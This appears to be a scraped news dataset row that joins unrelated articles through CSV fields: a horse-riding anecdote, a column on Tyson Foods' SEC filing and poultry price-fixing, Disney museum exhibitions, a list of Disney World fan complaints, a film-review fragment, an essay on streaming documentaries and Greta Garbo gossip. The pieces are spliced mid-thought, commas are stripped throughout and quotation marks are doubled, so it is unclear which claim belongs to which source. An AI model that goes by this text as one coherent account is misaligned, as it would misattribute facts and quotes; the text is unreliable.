But luckily another shopper with horse experience took the reins so Dickerson could run in and grab his food. Dickerson said Nugget used to belong to his grandmother in Iowa and now he rides her around Massachusetts to give people an experience they won’t forget.

“I honestly do it to see the smiles on the children’s faces” Dickerson said.

People have strange hobbies.

For example a Great Plains friend of mine once trained a chicken to play dead. Remarkably on command his chicken would take a whole-body flop that could have taught Steve Martin a thing or two about physical comedy.

Another friend a retired professor is (unsurprisingly really) even more iconoclastic: he reads Securities and Exchange Commission (SEC) corporate filings for fun. Honestly.

Why? Well first because he’s a nerd’s nerd and second because every now and then the professor stumbles across a brain-seizing gem like the one contained in the Oct. 2021 SEC filing by Tyson Foods.

“Many of our customers” reads Tyson’s 10-K a legally-mandated report “such as supermarkets warehouse clubs and food distributors have consolidated in recent years and consolidation is expected to continue throughout the United States and in other major markets.”

But “These consolidations” it continues “have produced large sophisticated customers with increased buying power who are more capable of operating with reduced inventories opposing price increases and demanding lower pricing increased promotional programs and specifically tailored products.”

Wait an Arkansas minute is Tyson Foods the proverbial Big Chicken of Big Big Meat warning shareholders of a possible market flop to newly “sophisticated consolidators” like “warehouse clubs” such as Walmart’s Sam’s Club and Costco?

Maybe because worrisomely “These customers also may use shelf space currently used for our products for their own private label products.”

There’s no “may” to it; many are already doing it.

Indeed in 2019 Costco began pushing the construction of a captive poultry supply chain – from contract chicken growers through its in-store chicken rotisseries – in eastern Nebraska for all retail stores west of the Mississippi River including Hawaii.

At the same time and a day’s drive east Walmart (as noted in this space in March 2019) already had “Walmart-contracted truckers hauling Walmart-contracted milk to a Walmart bottling plant that Walmart will then process and haul to Walmart stores on Walmart trucks to sell directly to Walmart customers.”

Tyson’s public recognition that its market power is being bled away by some of its biggest customers rather than some of its fiercest competitors came just weeks before several poultry company executives went on trial in Denver federal court for alleged price fixing in U.S. poultry markets.

Could these two events be simple serendipity or is there a connection between the meatpackers’ eroding pricing power and the systemic price-fixing the U.S. Department of Justice (DOJ) alleges occurred for several years between poultry slaughterers?

The DOJ doesn’t say but according to an Oct. 25 report by Forbes the department is more than emphatic in its investigation of “price-fixing on a mass scale… across the [poultry] industry’s top 18 companies which are responsible for some 99% of commercial chicken sold.”

Some of Big Chicken’s biggest customers however suspected something was wrong in the poultry market and they were angrier than a flock of wet hens. The angriest it appears was KFC the global chicken fast food chain.

According to early November testimony at the Denver trial one prosecution witness “told of an alleged interaction between (one) KFC” official who told a poultry company’s “executives that ‘he was going to beat us down with a hammer and baseball bat’ as payback for three years of high chicken prices.”

Hammers and bats aside end users like KFC Costco and Walmart – unlike hog farmers ranchers and poultry growers – increasingly have alternatives to giant meatpackers: they are establishing captive supply chains to provide their own customers with their own products.

And sure farmers and ranchers will still be part of those new chains but they’ll still be “chained” to the same now decades-old flow of market power – upward toward the retailer not backwards toward the farmer and rancher.

But it may take time for Tyson historically a chicken company to get used to the ages-old farm idea that what’s good for the goose is good for the gander.

DIS,Walt Disney,https://news.google.com/articles/CBMiNGh0dHBzOi8vYWlybWFpbC5uZXdzL2lzc3Vlcy8yMDIxLTEyLTExL2Rpc25leXMtd29ybGTSAQA?hl=en-US&gl=US&ceid=US%3Aen,"""Inspiring Walt Disney"" Opens at the Met","Back in the day Walt Disney’s animators were meticulous about their research. To get the deer and other animals in Bambi right they trooped off to the zoo for observation and sketching then wrangled fawns does rabbits and who knows what else into the studio for more of the same. Disney’s fairy-tale features didn’t aspire to quite that level of naturalism—no one at the studio was dissecting pixie anatomy—but neither did they lack for real-world grounding.

Beauty and the Beast’s Lumiere left which was inspired by the gilt-bronze candlestick designed by Juste Aurèle Meissonnier right.

A new exhibition at the Metropolitan Museum of Art “Inspiring Walt Disney: The Animation of French Decorative Arts” shows just how indebted Disney and his corporate heirs were to 18th-century Europe for the style of two classics Cinderella (1950) and Sleeping Beauty (1959) along with the latter-day Beauty and the Beast (1991). The show features 60 pieces mostly drawn from the Met’s collections—clocks vases teapots assorted porcelain tchotchkes—alongside concept art character studies and background paintings from several Disney archives and collections.

Bottom line: if you’ve been cursing Uncle Walt for your toddler daughter’s obsession with princessy pinks glittery curlicues and flounces of all kinds this show will convince you that long-dead artisans of la belle France must also shoulder some blame.

A concept drawing for Sleeping Beauty.

“Both Disney animated films and Rococo decorative works of art are infused with elements of playful storytelling delight and wonder” Max Hollein the Met’s director has observed. At times though it wouldn’t have been politic to say so an element of eager-to-please kitsch also factors in on both sides of the equation.

It’s not surprising that Disney artists would draw on the Rococo for Cinderella Sleeping Beauty and Beauty and the Beast since all three films are based on 18th-century French fairy tales (the tales’ written versions that is). But as the exhibition points out there’s an almost spiritual kinship too: a lot of pieces on display look like they’re almost itching to be animated.

The vision behind Beauty and the Beast’s Mrs. Potts can be traced back to an Aufenwerth workshop teapot in porcelain enamel and gold circa 1719–30.

Take a madly swirling gilt candlestick dated 1735–50; standing trapped in a case it looks nearly as alive as Lumiere the enchanted candlestick from Beauty and the Beast. A porcelain sculpture (circa 1743) of a once famous mezzo-soprano Faustina Bordoni belting out an aria accompanied by a fox playing harpsichord could be the seed for an entire animated feature though maybe one more in the Wes Anderson line.

Disney himself made frequent pilgrimages to France to soak up inspiration. The Met exhibition includes home movies of him and his family visiting the Palace of Versailles in 1935. One imagines that the future creator of Disneyland cast a particularly shrewd eye on the ersatz hamlet Marie Antoinette had built for herself on the grounds. Add a carnival ride and an admission fee you might just have something. —Bruce Handy

Which is no surprise really. Several of the company's celebrated theme parks feature a centrally located castle and a number of famous fairy tales featuring royals have become central parts of the Disney cinematic catalog.

Now some of the sparkliest items seen in the royal-rollicking films made by Disney will go on display at the Bowers Museum in Santa Ana starting on Dec. 12 2021.

""All That Glitters: The Crown Jewels of the Walt Disney Archives"" which is curated by the archives in partnership with the cultural museum will include several notable pieces items worn and seen in ""The Princess Diaries"" ""Aladdin"" ""Pollyanna"" and ""Romeo + Juliet"" too (accessories from both Disney and Fox films will be represented).

But wait: One piece that isn't worn by a royal but is as famous in the realm of filmdom as any real royal jewel will also be on view at the exhibit: Prepare to see the ""Heart of the Ocean"" from 1997's ""Titanic.""

In fact the show boasts a few intriguing accessories that aren't related to a royal character including a wristwatch worn by Dick Tracy.

The exhibit will unfurl in three distinct parts including ""Jewelry Informs Character"" ""Feature Vault"" and ""Reflections on Reality.""

While a Disney Park is all that and more sometimes Guests spot things that break the Disney magic bringing the real world into their vacation in a rather intrusive way.

Some might even go on to say ruining Walt Disney’s vision.

The Walt Disney World Resort in Central Florida is one of the world’s most popular vacation destinations. Magic Kingdom Park EPCOT Disney’s Hollywood Studios and Disney’s Animal Kingdom as well as Disney Springs are all celebrating the 50th anniversary of the Disney Resort AKA The World’s Most Magical Celebration. With timeless characters donning new EARidescent costumes new merchandise and new nighttime spectaculars like Disney Enchantment at Cinderella Castle Walt Disney World is a hub of magic wonder and dreams come true. But don’t forget the classic rides like Space Mountain Spaceship Earth and Haunted Mansion as well as the Disney water parks are all still available to experience.

Despite receiving backlash from the launch of Disney Genie Disney Genie+ and FastPass+ entrance replacement the Lightning Lane Walt Disney World — as well as other Disney Parks like Disneyland Resort — have seen huge crowds and long wait times showing that demand for the theme park experience is still there amid the pandemic. This was clear from the mammoth lines forming during the debut of Star Wars: Rise of the Resistance’s standby queue prior to Genie’s launch.

Speaking of virtual queue attractions EPCOT recently welcomed the new Disney Pixar-themed ride Remy’s Ratatouille Adventure at the France pavilion inside the World Showcase. The attraction sees Guests shrunk to the size of Remy the rat as they dodge and swerve around a busy Parisian kitchen. As one of the most beautiful pavilions the addition of Remy’s Ratatouille Adventure fits the French aesthetic in a seamless manner.

But not from all angles…

TikToker and Disney Park fan Disney World Tom (@waltdisneyworldparks) captured the moment he entered EPCOT via the Disney Skyliner.

Should Backstage at Disney be hidden from view?

The video which has gone viral with 1.6 million views asks the question of whether Backstage at Disney Parks should be hidden from view and themed to the corresponding area. Now some Disney fans will know that Disney has created two colors to use on specific areas but this massive green wall as Guests enter EPCOT Park via the Skyliner is sure to cause issues.

The comments on the viral video recognize that the wall should be themed with callouts against the Park for not continuing Walt’s vision of complete Imagineering. One comment said it “ruined the experience” while another stated it was “pure laziness”. Obviously not all Guests would see this part of the Park and it would not be on show when inside EPCOT and the France pavilion but for those on the Disney Skyliner it could put a dampener on a Guests visit as it seemingly breaks the Disney Magic.

There is also the notion that Disney is a theme park and not every single section can practice the level of Imagineering expected. However due to Disney Parks longevity as the leader in this area it is surprising that such a large part of a show building has been completed without detail.

Earlier this year another video surfaced of the show building for the brand-new and upcoming attraction Guardians of the Galaxy: Cosmic Rewind which is seemingly taking over the EPCOT skyline. The question is: Is Disney prioritizing big rides in favor of overall Park theming and experience? Only time will tell just how the Guardians coaster will be completed. At the other end of the spectrum the upcoming TRON ride at Magic Kingdom is definitely bringing the future to Tomorrowland.

There have been a lot of changes made in the parks and hotels over the past several years. Some of those changes have been great making park planning easier and more convenient. But other changes have caused many guests to say they’re “DONE” with Disney.

Just what is it that has fans UPSET with Disney World? We’re breaking it all down right here.

1 — Discontinuing Disney’s Magical Express

This has been a BIG one that many fans are still not over. Disney’s Magical Express was discontinued in 2022. As of January 1 2022 the free transportation service that shuttled guests to and from the Orlando International Airport and their Disney World resort hotels no longer exists…and a LOT of fans weren’t (and still aren’t) happy about it.

For many Disney’s Magical Express was their first “taste” of the magic — it set the tone for the rest of the trip was free and convenient and was a time-honored tradition. But the fact still remains — Disney’s Magical Express is officially gone so guests will have to select another way to get to and from the airport on future trips.

In January 2022 Mears (the company that operated the Magical Express) began offering a paid replacement for the Magical Express called “Mears Connect.”

Another somewhat similar option (that you also have to pay a fee for) is the Sunshine Flyer.

There are also rideshare options private vehicles rental cars and eventually the airport train that may still feature a stop “near” Disney World depending on how those plans ultimately get made.

Losing Magical Express was undoubtedly tough for many guests and it’s something that caused many to be upset with the House of Mouse. For travel tips that could make your next trip easier see our video below.

﻿

2 — Disney Genie+ and the Removal of FastPass+

Both the introduction of the paid Disney Genie+ service and the discontinuation of the free FastPass+ service have caused Disney fans to be rather upset (to put it mildly).

First is the pure removal of the FastPass+ system. That alone had guests disappointed since they had already become used to and fans of the FastPass+ system.

Next is the introduction of a system to replace it that is not free. The fact that you have to PAY for Disney Genie+ is another issue many have raised with the system. The price for the standard Genie+ service has started as low as $15 per person and gone up as high as $35 per person as of the latest updates to this post but that could change in the future. It is subject to surge pricing.

We won’t break down Genie+ in full detail here but know that Genie+ is the FastPass+ replacement service that allows you to see when you can next ride an attraction using that ride’s Lightning Lane. You can make your selections one at a time throughout the day and thereby skip some of the standby lines.

Aside from the fee there are some unique things about the way Genie operates that fans do NOT like. Some don’t like that you can only get one selection at a time. Others are not a fan of the fact that it cannot be used on the same ride more than once. Some feel like the service doesn’t provide good return times while others are upset that it makes such heavy use of your phone (requiring you to stay “connected” in a sense even while on vacation) and there are other complaints.

While some have felt that Genie+ is useful (or at least useful in some of the parks) others are NOT fans of the system and it has them wanting to say they’re DONE with Disney.

Big changes are planned for Genie+ in 2024 though and that could ease some guest complaints. In 2023 Disney shared “We have heard from guests that they would like ways to plan with Disney Genie+ service and individual Lightning Lane selections before the day of their park visit and we want you to know we are working on ways guests may do this for visits in 2024.” No other details have been shared but we’re on the lookout for updates!

For now it seems Genie+ won’t be going away though so it’s important to learn how to master it. Here are some posts you’ll want to take a look at before your next trip:

3 — Pay-Per-Ride Individual Lightning Lanes

Though it is related to Genie+ Individual Lightning Lanes or pay-per-ride is something that deserves its own category on this list. While Genie+ will let you make Lightning Lane selections at many rides in Disney World some rides are NOT included in the standard Genie+ service. Select highly popular rides are only available through Individual Lightning Lane.

So if you want to skip the virtual queues or standby lines at really popular rides including (as of the latest updates to this post) Star Wars: Rise of the Resistance Seven Dwarfs Mine Train TRON Lightcycle /Run Guardians of the Galaxy: Cosmic Rewind and Avatar: Flight of Passage you’ll have to pay to use the Lightning Lanes at those rides INDIVIDUALLY. You can only get a maximum of two pay-per-ride selections per day.

Prices for these individual Lightning Lanes vary by park date and ride.

Some fans have complained about the fact that you have to pay for this system (unlike the free FastPass+) these rides are NOT included in the standard Genie+ service so you’ll need to pay for them individually prices can vary by date or other factors (meaning you could experience surge pricing) you can only get two per day and you can only buy it once for any particular ride per day (in other words you can’t buy 2 of them for Rise of the Resistance for the same day).

Others have felt like the pay-per-ride service is worth it but it doesn’t stop the concerns and complaints from flowing in.

As we noted with Genie+ above despite complaints Individual Lightning Lanes aren’t going away (for now) so it’s important that you learn about the system and how to use it. Aside from our step-by-step guide to buying Individual Lightning Lanes (linked below) you can click here to see why staying at a Disney World hotel could be a big benefit (sometimes) when it comes to Individual Lightning Lanes.

4 — Nickel-and-Diming Guests

Some have shared that they’re “done” with Disney World because they feel like Disney has gotten to a point where they’re just nickel-and-diming their guests.

This can relate to a number of things but we’ve seen it brought up with things like Genie+ (a paid replacement for a formerly free service) the removal of free benefits/perks like the discontinuation of free MagicBands for resort hotel guests and Annual Passholders and more.

Some are not happy that they now have to pay for benefits that were once “free” or included in the purchase of their tickets/resort stay.

But don’t give up all home! There are still quite a few perks to enjoy and free things to take advantage of in Disney World. First up all Disney World hotel guests can still enjoy Early Theme Park Entry which allows them to go into the parks 30 minutes early on any day (with a valid ticket and Park Pass).

Those at Disney World Deluxe Hotels Deluxe Villas and select other hotels can also take advantage of Extended Evening Hours which lets them stay in the parks AFTER they’ve closed to regular guests for the day. This is available for select parks on certain days.

On top of that Disney World hotel guests and Annual Passholders can often get discounts on certain MagicBand designs you can still pick up free buttons and maps in the parks free cups of water are still available at most Quick Service restaurants and there are other benefits you can get at no additional cost.

5 — Taking Away Hotel Perks

This sort of goes hand-in-hand with the item mentioned above but many guests are particularly upset because they feel that Disney has taken away some of the free perks and benefits that used to come with staying at Disney World’s resort hotels.

Disney’s Magical Express is no more. Free MagicBands are no longer available for hotel guests. Package delivery from the parks to the hotels has not yet resumed. Early Theme Park Entry (which is essentially a replacement for Extra Magic Hours for the morning) is only available for 30 minutes each day in the morning for hotel guests and Extended Evening Hours is only available for Deluxe Resort Hotel and Deluxe Villas guests (along with guests at other select hotels).

Some feel that the “perks” they once got by staying at the resorts have dwindled taking away part of the magic.

But some hotel services have returned in recent years/months like full housekeeping services. Disney has often offered discounts on hotel stays throughout the year as well so at least you can bring that hotel cost down for your next trip. And FREE overnight parking for hotel guests has also returned.

Plus we’ve seen the free Hey Disney! service installed in select hotel rooms so that is an added benefit you may be able to use on an upcoming stay (it’s in the process of being rolled out to more hotel rooms).

We’ve also seen a number of hotel changes taking place like renovated rooms opening up at Disney’s Beach Club Resort and lobby updates announced for Disney’s Grand Floridian Resort & Spa. So more changes could be coming for the hotels that you may love. Will that make up for the disappearance of other perks? Maybe not but who knows what the future may hold.

6 — Making Things More Exclusive

Some Disney fans have also felt like Disney is making things more “exclusive” or making things only available for those who can pay top dollar.

For example Extra Magic Hours used to provide guests at ALL of Disney World’s hotels extra time in the parks either in the morning or at night on select nights. Now Early Theme Park Entry allows all hotel guests 30 minutes early entry into any Disney World theme park on any day.

But if you want extra time in the parks at night (Extended Evening Hours) you’ll have to stay at a Deluxe Resort Hotel or Deluxe Villa (or another qualifying hotel) (a.k.a. you’ll be looking at a pricey hotel bill in all likelihood).

The same concept sort of applies to the Genie+ system and Individual Lightning Lane system — both of which are only available to you if you opt to pay for them. While that cost might not be a big deal for some paying $35 per person for Genie+ on a peak day when traveling in a big group or over many days can REALLY add up.

How/whether Disney might change these situations in the future is not clear but we’ll be on the lookout for updates. We have seen some perks returned to guests (like free overnight parking for hotel guests) perks increased (like an increase in Annual Passholder discounts) and benefits added for some (like free PhotoPass attraction downloads with Genie+ purchases) so things could continue to adjust in the future!

7 — Missing Entertainment

Though many things have returned to Disney World there’s still quite a bit of entertainment that we haven’t heard any updates about. For example the Citizens of Main Street and Hollywood haven’t returned to the parks and we haven’t heard any update on their status.

We also are still waiting on things like the Voyage of the Little Mermaid in Disney’s Hollywood Studios Jedi Training: Trials of the Temple and select other entertainment options to return.

Those who felt like the entertainment offerings really set Disney World apart might be “done” with Disney for the moment at least until the missing entertainment options return.

In good news some offerings like the Festival of Fantasy Parade Happily Ever After fireworks and Fantasmic! show have returned. Plus EPCOT is getting a NEW fireworks show in 2023 new meet-and-greets have popped up an entire area of Hollywood Studios has reopened and a new Figment meet-and-greet has been announced. So you could still have quite a bit of entertainment to look forward to.

8 — Virtual Queues and 7AM Wake-Up Calls

Some people are frustrated with virtual queues in general and how they can be one of the only ways to get onto a ride. Though the virtual queue system has been discontinued for Star Wars: Rise of the Resistance in Disney World it is now being used for TRON Lightcycle / Run and is also being used at Guardians of the Galaxy: Cosmic Rewind.

If you don’t get a virtual queue spot for TRON or Cosmic Rewind you can pay for the Individual Lightning Lanes for these rides to get on them but some guests aren’t fans of the fact that there is no traditional standby option available.

In addition to the pure use of virtual queues the 7AM wake-up calls that come with virtual queues and Disney Genie+ are something many fans have complained about. If you’re hoping to get a virtual queue spot for TRON Lightcycle / Run or Cosmic Rewind the first boarding groups are distributed at 7AM on the morning of your trip to the park.

Boarding groups are also distributed at 1PM on the same day for those who couldn’t get a spot earlier but by not signing up at 7AM and holding out for the 1PM time you do run the risk of not getting a spot at all and not being able to ride. That’s already one reason you’ll need to wake up early during your trip.

The next is Disney Genie+. For the standard Genie+ service all guests can make their first Lightning Lane selection for the day at 7AM. If you’re hoping to get a good return time for really popular rides like Slinky Dog Dash in Hollywood Studios it’s important that you try to get a Lightning Lane for those rides as soon as they’re available. They can fill up quickly and if you wait too long you might be stuck with a VERY late return time or no return time at all.

The other reason why you’ll need to get up at the crack of dawn is Individual Lightning Lane (or pay-per-ride). If you want to snag your pay-per-ride selections early in the day (and get your ideal return time) you’ll want to act quickly. Disney World hotel guests can book their first pay-per-ride selections at 7AM on the day of their trip. All other guests can make their first selection when the park opens.

While you can make all of these 7AM selections (virtual queue Genie+ and pay-per-ride) from the comfort of your hotel room bed (you DON’T need to travel to the parks) you’ll still need to be awake to make them. And you won’t just want to wake up right at 7AM. You’ll need to be up several minutes before to make sure everything is set up properly in your app and you can refresh the page just at the right minute.

For some “the early bird gets the worm” is a phrase they always live by. But for others vacation = rest and relaxation and getting up at 7AM to see if you can hopefully score the passes you want isn’t exactly ideal.

It doesn’t always have to be miserable though! One way to potentially share the misery is to make sure all members of your group know how to purchase these things or make these selections. Then you could rotate who is in charge. If you’re responsible for waking up at 7AM on Saturday maybe Aunt Claire can be in charge of the 7AM selections on Sunday so you can sleep in that day. Splitting things up like that can ease the burden a bit.

9 — Too Expensive

A trip to Disney World can be expensive. That’s something that is (for the most part) universally known. But it seems like things are just getting more and more expensive bringing some people to the point of saying they’re “done” with the parks — by choice or by necessity.

We’ve seen price increases come to various restaurants throughout property. While these price increases are often small (maybe $1-2 sometimes more) they can add up over the period of a few days.

We’ve also seen price increases when it comes to Annual Passes in Disney World. In 2022 Disney also introduced surge pricing for one-day one-park tickets. And we’ve seen sneaky ticket price increases revealed for 2024 tickets.

Some have also shared that they feel it is very expensive to stay in the Disney World hotels.

We see price increases at Disney World all the time. It’s something we’ve seen over the past several years and something we’re likely to see time and time again in the future. Just how many people will feel like they’re “done” with Disney because of these increases remains to be seen.

But you don’t need to give up all hope. Current CEO of Disney Bob Iger does seem to be sensitive to some increased prices. According to some previous reports “Mr. Iger was alarmed by increases in prices at Disney theme parks that Mr. Chapek argued would boost revenue and limit overcrowding.” That hasn’t stopped prices from increasing while Iger remains as CEO — in fact we’ve seen various price increases take place or be announced — but it could mean that some increases will be a little less dramatic in the future.

We have also (on rare occasions) seen certain decreases in prices. And Disney has released a number of discounts on tickets hotels merchandise and food that could help you get a decent deal on your next trip. The increases may not stop but you can find some savings if you know where to look!

10 — Park Hopping is Still Limited

In 2021 Disney World brought back Park Hopping which was a HUGE deal for many fans. But it didn’t bring back Park Hopping exactly as it used to be. Guests still need a Park Pass reservation for the first park they want to visit (Park Passes alone are another cause of frustration for some guests) and guests must enter that first park before being able to hop to any other park.

Additionally guests can only Park Hop starting at 2PM each day to parks that are available (availability can vary). Though we haven’t really seen Park Hopping fill up on too many occasions it’s something that can happen and something to be aware of.

The limitations that still exist on Park Hopping particularly the fact that Park Hopping can only begin at 2PM each day is something that has caused some fans to say they’re “done” with Disney. Many guests miss the freedom that came with Park Hopping in the past — where guests could generally visit any park they wanted at any time.

As is the case with all things Park Hopping rules are subject to change. Park Pass rules ARE changing in 2024 at which point most guests (all those with date-based tickets) will NO LONGER be required to have Park Pass reservations. That could bring a change to Park Hopping too though Disney hasn’t announced any changes for Park Hopping yet.

For now you should be prepared to be subject to those limitations when hopping around Disney World but we’ll certainly be on the lookout for updates as to how it could change in the future!

Disney is constantly changing. The situations above that make some fans say they’re “done” with Disney World right now might be dramatically different in a month two months or a year. We’ve seen a lot of changes taking place in the past few months. Those changes combined with social media (and people’s ability to now easily express themselves online) have made some of these frustrations particularly evident and loud.

How will Disney change in the future? What things will frustrate fans? What things will pleasantly delight and surprise fans? Only time will tell and we’ll be around to share all of those updates with you.

The journalists are sober and passionate as they get down to work in a glass conference room. They publish the blockbuster then send the pair of scientists off to an influential morning news program “The Daily Rip” — think “Morning Joe” with a dash of “Live With Kelly and Ryan” — to promote the news. And that’s when things start to go awry. “Keep it light fun” one producer tells the scientists who are played by Jennifer Lawrence and Leonardo DiCaprio. As soon as they sit down the Joe Scarborough proxy played by an irresistible Tyler Perry leans in to ask what’s really on his mind: Is there life on other planets?

After putting up with the morning-show-style banter for much of the segment Jennifer Lawrence’s character has had enough. “Maybe the destruction of the entire planet isn’t supposed to be fun” she yells. “Maybe it’s supposed to be terrifying and unsettling and you should stay up all night every night crying.”

The clip of her losing it on the air earns wide attention — as a meme that gets likes and laughs on social media. Her boyfriend a reporter for a sardonic news site called Autopsy moves fast to make the most of her outburst under a two-sentence headline that’s its own kind of internet cliché: “You Know the Crazy Chick Who Thinks We’re All Going to Die?

To mark the occasion we’re running a series of essays about the future of everything we cover.

Remember when documentaries were deeply honorable but commercially unviable? “Knock Down the House” shattered Sundance records in 2019 when Netflix bought it for $10 million; Apple and A24 broke that record the next year with the $12 million acquisition of “Boys State.” Apple paid a reported $25 million for “Billie Eilish: The World’s a Little Blurry” while studios like Concordia Participant Radical and XTR pump millions into the non-fiction genre.

Today everyone loves documentaries. Streamers are hailed as giving the genre a new lease on life. However the streaming business is not dedicated to speaking truth to power as documentaries often do; streamers amass subscribers and create shareholder value.

So what does that mean for the future of documentaries? If the risk-averse franchise-dominated movie business is any example we should expect more documentaries about famous people or salacious subjects or expansions of proven properties. Or all of the above like the critically reviled second season of “Tiger King.”

It’s also a future in which documentary filmmaking is normal for a generation shaped by creating social-media confessionals. Compared to the earliest digital natives younger people who grew up in the age of Instagram have the luxury of taking these technologies for granted giving them an intuitive relationship to filmmaking tools.

“The fact that we have a generation of visual natives who are used to telling stories — and their own stories — in that way has just completely upped the ante of the field” said Carrie Lozano director of the Sundance Institute’s documentary program who previously taught at the UC Berkeley Graduate School of Journalism. “Their visual acuity is amazing. You don’t have to teach them to be cinematographers in quite the way we used to have to teach people to do that.”

It’s a long way from the first documentary boom. In 1994 and 1995 Fine Line Features acquired festival standouts “Hoop Dreams” and Sony Pictures Classics bought “Crumb” — rare exceptions in an indie marketplace driven by fictional narratives.

Three decades on documentaries dominate Sundance acquisitions driven by audience appetite for real-life stories — but that would not happen without streaming. In 2019 non-fiction films made up less than one percent of box-office grosses. By comparison documentaries and docuseries made up 16 percent of Netflix’s 2021 originals slate. On HBO Max it was 18 percent and around a quarter for Amazon Prime Video and Disney+ according to analytics firm Diesel Labs.

Streamers use non-fiction and unscripted titles to fight for relevancy and engagement through quality (HBO’s Emmy-nominated “Allen v. Farrow”) salacious virality (pandemic-binge watching of “Love Island” on Hulu) or subject matter (Hulu has Hillary Clinton Netflix has Taylor Swift and Apple TV+ has Billie Eilish).

Newsstands offered both the New Yorker and National Enquirer; likewise the golden age of documentary filmmaking deliverers both investigations and pop-culture titillation.

Sometimes it’s both: “Framing Britney Spears” produced by the New York Times for Hulu indulged the public’s fascination with the singer’s conservatorship while raising major questions about the legal system’s handling of her case; “Controlling Britney Spears” aired shortly thereafter. The streamer got its must-see-TV and a judge terminated Spears’ conservatorship.

Bryn Mooser CEO of non-fiction studio XTR says the public appetite for real-life is a boon for those focused on creating quality respected and innovative material. “An entirely new entertainment vertical has opened its doors. It feels more akin to gaming for me” he said. “Here’s hundreds of millions of people who want to watch more of this kind of filmmaking.”

Dependence on independence

Way back in 2005 Laura Ricciardi and Moira Demos began working on what would become “Making a Murderer.” After eight years of failing to attract the attention of legacy networks Netflix executives saw potential in the true-crime project. It debuted in 2015 as a hit. “The Staircase” with a production and distribution history that stretched back to 2004 became another Netflix hit in 2018.

Since then Hollywood’s biggest entertainment studio has taken on a more direct role in documentary production with followups to their own hits like “Tiger King” and “Wild Wild Country” but non-fiction often demands unique access perspective and patience — none of which conform to production-line tactics. That kind of risk belongs to the world of independent filmmaking and it’s likely to stay that way.

“Streamers aren’t going to take the risk” said Kevin Iwashina Endeavor Content’s head of documentary. “They’re not going to necessarily live with a film for five years and then have it come to fruition. They’d rather pay that mid-seven-figure or low eight-figure number for something someone else took the risk on. They’ve got to preserve capital for things that they know they can deliver within a finite period of time.”

Since CEO Jenifer Westphal founded non-fiction studio Wavelength in 2015 she’s backed over 60 films including “Knock Down the House” and “Athlete A.” “We love that space of development” Westphal said. “People call that high risk — it is absolutely.”

Wavelength got on board early with Isabel Bethencourt and Parker Hill’s feature debut “Cusp” a coming-of-age portrait of teens in a small Texas town. It won the 2021 Emerging Filmmaker Special Jury Award at Sundance; Showtime bought worldwide rights and it premiered over Thanksgiving weekend with select theatrical dates also in the mix.

“It takes a lot of time a lot of patience and a lot of experience to get these films to where they need to go” said Wavelength president Joe Plummer. “We’ve really doubled down on the strategy of supporting filmmakers.”

Premium non-fiction vs. trash TV

Responding to the rise of truth-adjacent formats like reality TV those working in the documentary ecosystem began distinguishing their work as “premium non-fiction.” The term began appearing in the trades in 2018 and became a shorthand to signal ethics and craft. It’s even codified in the corporate boilerplate at Discovery which bills a “portfolio of premium non-fiction lifestyle sports and kids content brands.”

That portfolio contains TLC shows “90 Day Fiance” and “Sister Wives” but the first acquisition for Discovery+ was SXSW 2021 premiere “Introducing Selma Blair.” The acclaimed film profiles Blair’s experience living with multiple sclerosis and satisfies Discovery’s fixation with medical phenomena without the exploitative undertones of TLC’s “1000-Lb. Sisters.”

“They know this is content that can appeal to everyone” said Iwashina who repped the film. “They smartly saw this as a way to declare that they were in the premium-space business.”

Those who consider their work as premium say there’s something to be learned from their reality kin. “We have borrowed heavily from it on our team” said Mooser. “I think the notion that all documentaries need to take years and years and cost all this money to make is also an old convention. Reality TV people news people know how to turn around stories quickly.”

More sales fewer record breakers

Netflix bought Robert Greene’s Catholic sex-abuse doc “Procession” out of Telluride this year but the studio has a limited appetite for bold filmmaking acquisitions. Filmmakers with “riskier” documentaries — the kinds of films that defined the format for decades — are less likely to be bought by major streamers. They’re more likely to be embraced by some of same small outlets that shaped the original documentary market or their modern counterparts.

Wavelength sold “Feels Good Man” a film about Pepe the Frog creator Matt Furie to ITVS for the long-running PBS series “Independent Lens.” The studio’s the Iowa-set golf-focused short “The Foursome” found its audience on a PGA Tour YouTube channel and will be broadcast by Iowa PBS early next year.

“The fear is ‘Well there’s going to be no space for independent voices it’s all just going to be owned by Disney and owned by Netflix'” Westphal said. “For us it’s not like ‘Oh God we didn’t sell it to Netflix so we’re never going to see it everywhere.’ We celebrate all the platforms our films end up on.”

XTR sold “Mucho Mucho Amor” to Netflix. “Faya Dayi” went to doc stalwart Janus Films and “Bloody Nose Empty Pockets” went to Utopia Distribution which placed the film on streaming service Topic. Kino Lorber which has its own online marketplace Kino Now has arrangements with more than 20 streaming services ranging from Sundance Now to the fledgling Curia. “Every week there’s a new SVOD knocking” said Richard Lorber president and CEO of Kino Lorber. “We’re not giving away our content.”

Facts as commodity

With the documentary boom came the idea that non-fiction has an endless capacity for compelling storytelling. But that comes with a risk.

“There is a danger that we are so hooked on story” said Tabitha Jackson director of the Sundance Film Festival. “Particularly the kind of Western three-act story structure with conflict and resolution and a hero — often a him — who wants something he can’t have: How’s he going to get it? That’s what many gatekeepers mean by story … the beautiful diversity and richness of the non-fiction form is being narrowed and all commodified into that kind of story. Non-fiction is wearing the clothes of fiction or television and attracting those audiences because it’s so satisfying.”

Wherever there are cameras — and they are everywhere — comes an opportunity to make money and shape the way people understand the world. Even as documentaries become more like blockbusters festivals and other nonprofits will be essential to keep them honest.

“I wish that as viewers engage with a piece of work or film they are asking themselves ‘What is this?’” said Jackson. “And part of what might give you a clue as to what this is is who made it. This isn’t what you’re explicitly thinking when you’re watching it — but who made it who funded it what perspectives does the maker have is essential to answering that basic question of what it is.”",https://news.google.com/articles/CBMiTWh0dHBzOi8vbnlwb3N0LmNvbS8yMDIxLzEyLzExL2luc2lkZS1hY3RyZXNzLWdyZXRhLWdhcmJvcy1saWJlcnRpbmUtc2V4LWxpZmUv0gEA?hl=en-US&gl=US&ceid=US%3Aen,Inside actress Greta Garbo's libertine sex life,"Greta Garbo chose to never marry but she sure loved to get around. The silver-screen icon went out with men and women gays and straights singletons and married people and she did it all on her own terms.

After he enlisted in the military at the start of WWII the actor Gilbert Roland wrote in his memoirs that Garbo took him to bed to celebrate even giving him a pair of her panties as a keepsake. Then when he returned home from leave months later and reached out to her Garbo refused to take his calls.

Because the actress was so private she never kissed and told. But it was widely known that she bedded the mostly gay fashion photographer Cecil Beaton. Starting in the mid-40s and continuing for three decades Garbo and Beaton dated intermittently and were seen together at different times in New York and California London and Paris.

Beaton gossiped about his liaisons with Garbo with author Truman Capote who later said to Hugo Vickers Beaton’s official biographer: “Curiously enough Cecil was one of the few people who gave her any physical satisfaction.”

Beaton also told Vickers he wasn’t sure how he did it.

